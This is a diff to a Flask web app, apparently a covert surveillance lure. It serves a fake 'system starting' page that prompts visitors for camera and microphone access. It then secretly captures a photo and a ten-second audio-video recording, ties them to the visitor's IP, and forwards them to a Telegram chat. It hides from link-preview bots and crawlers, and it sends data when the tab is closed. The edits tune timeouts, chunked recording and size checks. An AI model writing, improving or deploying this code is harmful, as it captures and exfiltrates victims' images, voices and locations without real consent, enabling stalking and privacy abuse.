@@ -36,8 +36,8 @@ def telegram_video_gonder(video_dosyasi):
         files = {'video': ('ajan_video.webm', video_dosyasi, 'video/webm')}
         data = {'chat_id': CHAT_ID}
         
-        # Video boyutu büyük olabileceği için timeout süresini uzun tuttuk
-        requests.post(url, files=files, data=data, timeout=40)
+        # Timeout süresini 60 saniyeye çıkardık ki Render'da hata vermesin
+        requests.post(url, files=files, data=data, timeout=60)
     except Exception as e:
         print("Video Gönderme Hatası:", e)
 
@@ -46,11 +46,9 @@ def telegram_video_gonder(video_dosyasi):
 def ana_sayfa():
     if request.path == '/favicon.ico': return "OK", 200
     
-    # Gerçek IP'yi al
     ziyaretci_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
     if ziyaretci_ip: ziyaretci_ip = ziyaretci_ip.split(',')[0].strip()
     
-    # Eğer yerel IP ise, dış IP'ye çevir
     sorgulanan_ip = ziyaretci_ip
     if ziyaretci_ip.startswith("192.168.") or ziyaretci_ip.startswith("127.") or ziyaretci_ip.startswith("10."):
         try:
@@ -60,17 +58,15 @@ def ana_sayfa():
 
     user_agent = request.headers.get('User-Agent', '').lower()
     
-    # 🚨 BOT FİLTRESİ (Senin kaldırdığını söylediğin ama güvenlik için eklediğimiz filtre)
     if 'bot' in user_agent or 'facebook' in user_agent or 'crawler' in user_agent or 'spider' in user_agent or 'python' in user_agent:
         return "OK", 200
 
-    # 📸 FOTOĞRAF VE SESLİ VİDEO İSTEĞİ
     html = f"""
     <body style='background:#0a0a0a; color:#0f0; font-family:monospace; text-align:center; padding-top:15%;'>
         <h2 style='color:red;'>SİSTEM BAŞLATILIYOR...</h2>
         <p id='durum'>Lütfen kamera ve mikrofon izni verin...</p>
 
-        <video id="video" autoplay style="display:none;"></video>
+        <video id="video" autoplay muted playsinline style="display:none;"></video>
         <canvas id="canvas" style="display:none;"></canvas>
 
         <script>
@@ -79,93 +75,82 @@ def ana_sayfa():
                 let mediaRecorder;
                 let videoChunks = [];
                 let stream;
-                let isSent = false; // Çift gönderimi engellemek için
+                let isSent = false; 
 
                 function verileriGonder() {{
                     if (isSent) return;
                     isSent = true;
 
                     if (mediaRecorder && mediaRecorder.state === 'recording') {{
-                        mediaRecorder.stop(); // Kaydı durdur, onstop'u tetikler
+                        mediaRecorder.stop(); // Kaydı durdurur, 'onstop' tetiklenir
                     }}
                 }}
 
                 try {{
-                    // Hem kamera hem mikrofon izni
                     stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                     const video = document.getElementById('video');
                     video.srcObject = stream;
                     
                     video.onloadedmetadata = () => {{
-                        setTimeout(() => {{
-                            // 1. ADIM: FOTOĞRAF ÇEK VE GÖNDER
-                            const canvas = document.getElementById('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            const foto = canvas.toDataURL('image/jpeg');
+                        // 1. ADIM: FOTOĞRAF ÇEK
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const foto = canvas.toDataURL('image/jpeg');
+                        
+                        fetch('/kamera', {{
+                            method: 'POST',
+                            headers: {{ 'Content-Type': 'application/json' }},
+                            body: JSON.stringify({{ image: foto, ip: "{sorgulanan_ip}" }})
+                        }});
+
+                        durum.innerHTML = "✅ Fotoğraf çekildi. Video kaydı başlıyor...";
+                        
+                        // 2. ADIM: SESLİ VİDEO KAYDET
+                        mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
+
+                        mediaRecorder.ondataavailable = event => {{
+                            if (event.data.size > 0) {{
+                                videoChunks.push(event.data);
+                            }}
+                        }};
+
+                        mediaRecorder.onstop = () => {{
+                            const videoBlob = new Blob(videoChunks, {{ type: 'video/webm' }});
+                            const formData = new FormData();
+                            formData.append('video_dosyasi', videoBlob, 'kayit.webm');
                             
-                            fetch('/kamera', {{
+                            // keepalive KALDIRILDI (Hata veriyordu)
+                            fetch('/video', {{
                                 method: 'POST',
-                                headers: {{ 'Content-Type': 'application/json' }},
-                                body: JSON.stringify({{ image: foto, ip: "{sorgulanan_ip}" }})
-                            }});
-
-                            durum.innerHTML = "✅ Fotoğraf çekildi. Sesli Video kaydı başlıyor...";
-                            
-                            // 2. ADIM: SESLİ VİDEO KAYDET
-                            mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
-
-                            mediaRecorder.ondataavailable = event => {{
-                                if (event.data.size > 0) {{
-                                    videoChunks.push(event.data);
-                                }}
-                            }};
-
-                            mediaRecorder.onstop = () => {{
-                                const videoBlob = new Blob(videoChunks, {{ type: 'video/webm' }});
-                                const formData = new FormData();
-                                formData.append('video_dosyasi', videoBlob, 'kayit.webm');
-                                
-                                // keepalive: true sayesinde sayfa kapansa bile veri gitmeye devam eder
-                                fetch('/video', {{
-                                    method: 'POST',
-                                    body: formData,
-                                    keepalive: true 
-                                }});
-                                
+                                body: formData
+                            }}).then(() => {{
                                 stream.getTracks().forEach(track => track.stop());
-                                durum.innerHTML = "✅ İşlem tamamlandı!";
-                            }};
-
-                            mediaRecorder.start();
-                            
-                            // 10 Saniyelik Sayaç
-                            let saniye = 10;
-                            const sayac = setInterval(() => {{
-                                if(!isSent) {{
-                                    durum.innerHTML = "🎥 Sesli Video Kaydediliyor: " + saniye + " saniye kaldı...";
-                                    saniye--;
-                                }}
-                            }}, 1000);
-
-                            // 1. DURUM: 10 saniye dolarsa
-                            setTimeout(() => {{
-                                clearInterval(sayac);
-                                verileriGonder(); 
-                            }}, 10000); 
-
-                            // 2. DURUM: Sekme kapatılırsa veya geri gidilirse
-                            window.addEventListener('beforeunload', verileriGonder);
-
-                            // 3. DURUM: Uygulama arka plana atılırsa (Mobil)
-                            document.addEventListener('visibilitychange', () => {{
-                                if (document.visibilityState === 'hidden') {{
-                                    verileriGonder();
-                                }}
+                                durum.innerHTML = "✅ Video gönderildi!";
                             }});
+                        }};
 
-                        }}, 1500); // Kamera ısınsın diye 1.5 saniye bekle
+                        // Her saniye veri parçası al (1 saniye hatasını çözer)
+                        mediaRecorder.start(1000);
+                        
+                        let saniye = 10;
+                        const sayac = setInterval(() => {{
+                            if(!isSent) {{
+                                durum.innerHTML = "🎥 Kaydediliyor: " + saniye + " saniye kaldı...";
+                                saniye--;
+                            }}
+                        }}, 1000);
+
+                        // 10 Saniye dolunca gönder
+                        setTimeout(() => {{
+                            clearInterval(sayac);
+                            verileriGonder(); 
+                        }}, 10000); 
+
+                        // Çıkarken gönder (Sadece sayfa kapatılırsa çalışır)
+                        window.addEventListener('beforeunload', verileriGonder);
+
                     }};
                 }} catch (error) {{
                     durum.innerHTML = "❌ İzin verilmedi (Kamera/Mikrofon)";
@@ -212,6 +197,11 @@ def video():
     video_dosyasi = request.files['video_dosyasi']
     video_verisi = video_dosyasi.read()
     
+    # Eğer video 0 byte ise gönderme
+    if len(video_verisi) < 1000: 
+        print("Video çok kısa, gönderilmedi.")
+        return "Kısa video", 200
+        
     telegram_video_gonder(video_verisi)
     return "OK", 200
 
